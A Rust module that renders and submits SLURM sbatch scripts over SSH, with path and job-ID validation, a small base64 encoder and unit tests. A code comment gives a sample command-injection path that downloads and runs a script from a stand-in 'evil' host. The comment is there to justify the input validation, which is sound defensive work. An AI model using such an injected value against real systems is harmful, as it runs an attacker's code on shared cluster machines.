//! Render + submit an `sbatch` script for a single task. Parses the
//! job ID from `sbatch --parsable`. Submission is deterministic: same
//! task + envelope + resource class produces the same script body, so
//! rerunning a task is reproducible (modulo external SLURM state).

use super::ssh::SshSession;
use anyhow::{anyhow, Result};
use std::collections::BTreeMap;
use std::fmt::Write as _;

/// Spec driving one `sbatch` submission. All fields flow into the
/// `#SBATCH` directive block at the top of the rendered script.
#[derive(Debug, Clone)]
pub struct SbatchSpec {
    /// Human-readable job name. Rendered as `--job-name=`. Kept short
    /// to avoid collisions with SLURM's internal 64-char limit.
    pub job_name: String,
    /// `--partition=<value>`. Required.
    pub partition: String,
    /// Optional `--qos=<value>`.
    pub qos: Option<String>,
    /// Optional `--account=<value>` — billing/project account.
    pub account: Option<String>,
    pub cpus_per_task: u32,
    /// `--mem=<value>` in SLURM's native syntax (`16G`, `64000M`, etc).
    pub mem: String,
    /// Optional `--gres=<value>` (e.g. `gpu:a100:2`).
    pub gres: Option<String>,
    /// Wall-clock limit (`--time=<DD-HH:MM:SS>` or `HH:MM:SS`).
    pub time_limit: String,
    /// Stdout/stderr file destinations, relative to the remote package
    /// dir. `--output=<path>`.
    pub output_path: String,
    /// Optional `module load` list for the job prologue. Each entry
    /// becomes one `module load <name>` line. Empty = no prologue.
    pub modules: Vec<String>,
    /// Env vars to export into the job. Rendered as `#SBATCH --export=`
    /// list so the compute node sees the hardware envelope + agent
    /// config without a second round-trip.
    pub exports: BTreeMap<String, String>,
    /// The shell body to run on the compute node, after the module
    /// prologue. Typically a single invocation of
    /// `run-task-on-slurm.sh`.
    pub body: String,
}

/// Render the sbatch script. Ordering is stable (BTreeMap for exports,
/// Vec iteration for modules) so the output is byte-reproducible.
pub fn render_sbatch_script(spec: &SbatchSpec) -> String {
    let mut s = String::new();
    writeln!(&mut s, "#!/bin/bash").unwrap();
    writeln!(&mut s, "#SBATCH --job-name={}", spec.job_name).unwrap();
    writeln!(&mut s, "#SBATCH --partition={}", spec.partition).unwrap();
    if let Some(qos) = &spec.qos {
        writeln!(&mut s, "#SBATCH --qos={qos}").unwrap();
    }
    if let Some(account) = &spec.account {
        writeln!(&mut s, "#SBATCH --account={account}").unwrap();
    }
    writeln!(&mut s, "#SBATCH --cpus-per-task={}", spec.cpus_per_task).unwrap();
    writeln!(&mut s, "#SBATCH --mem={}", spec.mem).unwrap();
    if let Some(gres) = &spec.gres {
        writeln!(&mut s, "#SBATCH --gres={gres}").unwrap();
    }
    writeln!(&mut s, "#SBATCH --time={}", spec.time_limit).unwrap();
    writeln!(&mut s, "#SBATCH --output={}", spec.output_path).unwrap();
    if !spec.exports.is_empty() {
        let joined: Vec<String> = spec
            .exports
            .iter()
            .map(|(k, v)| format!("{k}={v}"))
            .collect();
        writeln!(&mut s, "#SBATCH --export={}", joined.join(",")).unwrap();
    }
    writeln!(&mut s).unwrap();
    writeln!(&mut s, "set -euo pipefail").unwrap();
    writeln!(&mut s).unwrap();
    for m in &spec.modules {
        writeln!(&mut s, "module load {m}").unwrap();
    }
    if !spec.modules.is_empty() {
        writeln!(&mut s).unwrap();
    }
    s.push_str(&spec.body);
    if !spec.body.ends_with('\n') {
        s.push('\n');
    }
    s
}

/// Submit a rendered script to the cluster via the provided SSH session.
///
/// Flow:
/// 1. Write the script to `<script_path>` on the remote host (via
/// `cat > <path>` heredoc). Kept in a stable location so
/// rerunning a failing job can re-submit the same script.
/// 2. `sbatch --parsable <script_path>` — returns just `JOBID` (or
/// `JOBID;CLUSTER`) on stdout when successful.
/// 3. Parse the JOBID out of stdout.
pub fn submit_sbatch(ssh: &dyn SshSession, script_path: &str, script_body: &str) -> Result<String> {
    // `script_path` is interpolated three times into a remote
    // `bash -c` line below. Without validation a malicious path like
    // `/tmp/$(curl evil|sh)/x.sbatch` runs the attacker's command on
    // the SLURM login node. Same shape rule the SLURM probe path uses
    // for `package_dir` — alnum + `_` + `.` + `-` per `/`-segment, no
    // leading `-`, length-bounded.
    if !super::super::_id_validator::package_dir_is_safe(script_path) {
        return Err(anyhow!(
            "refusing sbatch with unsafe script_path: {script_path:?}"
        ));
    }
    // Base64-encode the script so heredoc delimiters and special chars
    // in the body can't break out of the shell context. `base64 -d`
    // is present on every Linux cluster we care about.
    let encoded = base64_encode(script_body.as_bytes());
    let cmd = format!(
        "mkdir -p $(dirname {script_path}) && echo '{encoded}' | base64 -d > {script_path} && chmod +x {script_path}"
    );
    let write = ssh.run(&cmd)?;
    if !write.is_success() {
        return Err(anyhow!(
            "failed to stage sbatch script to {script_path} (exit {}): {}",
            write.exit_code,
            write.stderr
        ));
    }
    let submit = ssh.run(&format!("sbatch --parsable {script_path}"))?;
    if !submit.is_success() {
        return Err(anyhow!(
            "sbatch submission failed (exit {}): {}",
            submit.exit_code,
            submit.stderr
        ));
    }
    parse_job_id(&submit.stdout).ok_or_else(|| {
        anyhow!(
            "could not parse job id from sbatch stdout: {:?}",
            submit.stdout
        )
    })
}

/// Cancel a running/pending job. Idempotent — SLURM returns success
/// even when the job id is unknown.
pub fn scancel(ssh: &dyn SshSession, job_id: &str) -> Result<()> {
    // `job_id` is interpolated into a bash command. It is always
    // sourced from `parse_job_id` (digits-only) on the happy path,
    // but defense-in-depth refuses anything outside the id-validator
    // shape before composing the shell line.
    if !super::super::_id_validator::is_safe_id(job_id) {
        return Err(anyhow!("refusing scancel with unsafe job_id: {job_id:?}"));
    }
    let out = ssh.run(&format!("scancel {job_id}"))?;
    if !out.is_success() {
        return Err(anyhow!(
            "scancel {job_id} failed (exit {}): {}",
            out.exit_code,
            out.stderr
        ));
    }
    Ok(())
}

/// Extract the integer job ID from `sbatch --parsable` output. The flag
/// returns either `JOBID` or `JOBID;CLUSTER`; we take everything before
/// the first semicolon and verify it parses as an integer.
pub fn parse_job_id(stdout: &str) -> Option<String> {
    let trimmed = stdout.trim();
    if trimmed.is_empty() {
        return None;
    }
    let id = trimmed.split(';').next().unwrap_or(trimmed);
    if id.chars().all(|c| c.is_ascii_digit()) && !id.is_empty() {
        Some(id.to_string())
    } else {
        None
    }
}

/// Public reexport so
/// `staging::stage_credentials_file` can use the same encoder for
/// the per-job creds-file body.
pub(super) fn base64_encode_public(bytes: &[u8]) -> String {
    base64_encode(bytes)
}

/// Minimal base64 encoder — avoids adding the `base64` crate. SLURM
/// scripts are small (a few KB at most) so perf doesn't matter.
fn base64_encode(bytes: &[u8]) -> String {
    const ALPHABET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = String::with_capacity(bytes.len().div_ceil(3) * 4);
    let mut i = 0;
    while i + 3 <= bytes.len() {
        let b0 = bytes[i];
        let b1 = bytes[i + 1];
        let b2 = bytes[i + 2];
        out.push(ALPHABET[(b0 >> 2) as usize] as char);
        out.push(ALPHABET[(((b0 & 0x03) << 4) | (b1 >> 4)) as usize] as char);
        out.push(ALPHABET[(((b1 & 0x0f) << 2) | (b2 >> 6)) as usize] as char);
        out.push(ALPHABET[(b2 & 0x3f) as usize] as char);
        i += 3;
    }
    let remaining = bytes.len() - i;
    if remaining == 1 {
        let b0 = bytes[i];
        out.push(ALPHABET[(b0 >> 2) as usize] as char);
        out.push(ALPHABET[((b0 & 0x03) << 4) as usize] as char);
        out.push('=');
        out.push('=');
    } else if remaining == 2 {
        let b0 = bytes[i];
        let b1 = bytes[i + 1];
        out.push(ALPHABET[(b0 >> 2) as usize] as char);
        out.push(ALPHABET[(((b0 & 0x03) << 4) | (b1 >> 4)) as usize] as char);
        out.push(ALPHABET[((b1 & 0x0f) << 2) as usize] as char);
        out.push('=');
    }
    out
}

#[cfg(test)]
mod tests {
    use super::super::ssh::{FakeSshSession, SshOutcome};
    use super::*;

    fn base_spec() -> SbatchSpec {
        SbatchSpec {
            job_name: "scripps-task".into(),
            partition: "normal".into(),
            qos: None,
            account: None,
            cpus_per_task: 4,
            mem: "16G".into(),
            gres: None,
            time_limit: "02:00:00".into(),
            output_path: "runtime/agent-%j.log".into(),
            modules: vec![],
            exports: BTreeMap::new(),
            body: "run-task-on-slurm.sh".into(),
        }
    }

    #[test]
    fn render_emits_shebang_and_required_sbatch_directives() {
        let s = render_sbatch_script(&base_spec());
        assert!(s.starts_with("#!/bin/bash\n"));
        assert!(s.contains("#SBATCH --job-name=scripps-task"));
        assert!(s.contains("#SBATCH --partition=normal"));
        assert!(s.contains("#SBATCH --cpus-per-task=4"));
        assert!(s.contains("#SBATCH --mem=16G"));
        assert!(s.contains("#SBATCH --time=02:00:00"));
        assert!(s.contains("#SBATCH --output=runtime/agent-%j.log"));
        // No optional fields set → no qos/account/gres/export lines.
        assert!(!s.contains("--qos="));
        assert!(!s.contains("--account="));
        assert!(!s.contains("--gres="));
        assert!(!s.contains("--export="));
    }

    #[test]
    fn render_emits_optional_fields_when_set() {
        let mut spec = base_spec();
        spec.qos = Some("normal".into());
        spec.account = Some("lotz-lab".into());
        spec.gres = Some("gpu:a100:2".into());
        let s = render_sbatch_script(&spec);
        assert!(s.contains("#SBATCH --qos=normal"));
        assert!(s.contains("#SBATCH --account=lotz-lab"));
        assert!(s.contains("#SBATCH --gres=gpu:a100:2"));
    }

    #[test]
    fn render_exports_are_sorted_deterministically() {
        let mut spec = base_spec();
        spec.exports.insert("ZETA".into(), "3".into());
        spec.exports.insert("ALPHA".into(), "1".into());
        spec.exports.insert("MU".into(), "2".into());
        let s = render_sbatch_script(&spec);
        // BTreeMap iteration yields alphabetical order.
        assert!(s.contains("#SBATCH --export=ALPHA=1,MU=2,ZETA=3"));
    }

    #[test]
    fn render_emits_module_loads_before_body() {
        let mut spec = base_spec();
        spec.modules = vec!["python/3.11".into(), "singularity/3.8".into()];
        spec.body = "python3 -c 'pass'".into();
        let s = render_sbatch_script(&spec);
        let mod_idx = s.find("module load python/3.11").unwrap();
        let body_idx = s.find("python3 -c").unwrap();
        assert!(mod_idx < body_idx, "module loads must precede body: {s}");
        assert!(s.contains("module load singularity/3.8"));
    }

    #[test]
    fn render_produces_byte_reproducible_output_for_same_spec() {
        // Sanity: two renders of the same spec must be byte-identical.
        // Essential because callers hash the script to detect
        // re-submission of an identical task.
        let spec = base_spec();
        let a = render_sbatch_script(&spec);
        let b = render_sbatch_script(&spec);
        assert_eq!(a, b);
    }

    #[test]
    fn render_appends_newline_when_body_lacks_one() {
        let mut spec = base_spec();
        spec.body = "echo done".to_string();
        let s = render_sbatch_script(&spec);
        assert!(s.ends_with('\n'), "script must end with newline: {s:?}");
    }

    #[test]
    fn parse_job_id_handles_plain_integer() {
        assert_eq!(parse_job_id("12345\n"), Some("12345".to_string()));
        assert_eq!(parse_job_id("  678  "), Some("678".to_string()));
    }

    #[test]
    fn parse_job_id_handles_cluster_suffix() {
        // `sbatch --parsable` may emit `JOBID;CLUSTER` on federated
        // setups. We take everything before the semicolon.
        assert_eq!(parse_job_id("99901;prod\n"), Some("99901".to_string()));
    }

    #[test]
    fn parse_job_id_rejects_non_numeric_output() {
        assert!(parse_job_id("").is_none());
        assert!(parse_job_id("error: queue full").is_none());
        assert!(parse_job_id("foo;bar").is_none());
    }

    #[test]
    fn submit_sbatch_happy_path_returns_job_id() {
        let fake = FakeSshSession::new("cluster");
        // Stage + submit both succeed.
        fake.expect("mkdir -p", SshOutcome::success(""));
        fake.expect(
            "sbatch --parsable /scratch/jobs/task-1.sbatch",
            SshOutcome::success("56789\n"),
        );
        let id = submit_sbatch(
            &fake,
            "/scratch/jobs/task-1.sbatch",
            "#!/bin/bash\necho hi\n",
        )
        .unwrap();
        assert_eq!(id, "56789");
    }

    #[test]
    fn submit_sbatch_surfaces_submission_failure() {
        let fake = FakeSshSession::new("cluster");
        fake.expect("mkdir -p", SshOutcome::success(""));
        fake.expect(
            "sbatch --parsable /scratch/jobs/task-2.sbatch",
            SshOutcome::failure("sbatch: error: Invalid partition", 1),
        );
        let err = submit_sbatch(&fake, "/scratch/jobs/task-2.sbatch", "#!/bin/bash\n").unwrap_err();
        assert!(err.to_string().contains("sbatch submission failed"));
    }

    #[test]
    fn submit_sbatch_surfaces_staging_failure() {
        let fake = FakeSshSession::new("cluster");
        fake.expect("mkdir -p", SshOutcome::failure("permission denied", 1));
        let err = submit_sbatch(&fake, "/scratch/jobs/task-3.sbatch", "#!/bin/bash\n").unwrap_err();
        assert!(err.to_string().contains("failed to stage sbatch script"));
    }

    #[test]
    fn submit_sbatch_rejects_unparseable_job_id() {
        let fake = FakeSshSession::new("cluster");
        fake.expect("mkdir -p", SshOutcome::success(""));
        fake.expect(
            "sbatch --parsable /scratch/jobs/task-4.sbatch",
            SshOutcome::success("not-a-number"),
        );
        let err = submit_sbatch(&fake, "/scratch/jobs/task-4.sbatch", "#!/bin/bash\n").unwrap_err();
        assert!(err.to_string().contains("could not parse job id"));
    }

    #[test]
    fn scancel_issues_command_with_job_id() {
        let fake = FakeSshSession::new("cluster");
        fake.expect("scancel 12345", SshOutcome::success(""));
        scancel(&fake, "12345").unwrap();
        let calls = fake.calls();
        assert!(calls.iter().any(|c| c == "scancel 12345"));
    }

    #[test]
    fn scancel_surfaces_failure() {
        let fake = FakeSshSession::new("cluster");
        fake.expect("scancel 99999", SshOutcome::failure("Invalid job id", 1));
        let err = scancel(&fake, "99999").unwrap_err();
        assert!(err.to_string().contains("scancel 99999 failed"));
    }

    #[test]
    fn base64_encode_matches_known_vectors() {
        // RFC 4648 test vectors.
        assert_eq!(base64_encode(b""), "");
        assert_eq!(base64_encode(b"f"), "Zg==");
        assert_eq!(base64_encode(b"fo"), "Zm8=");
        assert_eq!(base64_encode(b"foo"), "Zm9v");
        assert_eq!(base64_encode(b"foob"), "Zm9vYg==");
        assert_eq!(base64_encode(b"fooba"), "Zm9vYmE=");
        assert_eq!(base64_encode(b"foobar"), "Zm9vYmFy");
    }

    #[test]
    fn submit_sbatch_base64_round_trips_multiline_script() {
        // Verify the encoding preserves newlines / special chars that
        // would otherwise break a heredoc.
        let fake = FakeSshSession::new("cluster");
        fake.expect("mkdir -p", SshOutcome::success(""));
        fake.expect(
            "sbatch --parsable /x/task.sbatch",
            SshOutcome::success("42"),
        );
        let script = "#!/bin/bash\necho 'hello $world'\nEOF_NOT_REAL\n";
        let id = submit_sbatch(&fake, "/x/task.sbatch", script).unwrap();
        assert_eq!(id, "42");
        // The staging call must embed the base64-encoded body.
        let calls = fake.calls();
        let stage = calls
            .iter()
            .find(|c| c.contains("base64 -d"))
            .expect("staging call must use base64 -d");
        // It must NOT inline the raw script (which would contain EOF_NOT_REAL).
        assert!(
            !stage.contains("EOF_NOT_REAL"),
            "staging must not leak raw script content: {stage}"
        );
    }
}
